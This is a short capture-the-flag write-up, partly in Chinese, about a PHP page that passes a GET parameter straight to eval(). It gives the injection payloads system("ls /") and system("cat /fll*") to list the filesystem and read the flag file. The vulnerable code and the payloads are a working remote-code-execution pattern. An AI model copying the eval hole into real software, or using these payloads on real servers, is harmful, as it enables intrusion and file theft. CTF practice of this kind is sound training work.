#RCE

```php
<?php
	error_reporting(0);
	highlight_file(__FILE__);
	if(isset($_GET['url']))
	{
		eval($_GET['url']);
	}
?>
```

执行命令  
`?url=system("ls /");`  
查看全部文件

发现 flllllaaaaaaggggggg  
查看 flag
`?url=system("cat /fll*");`
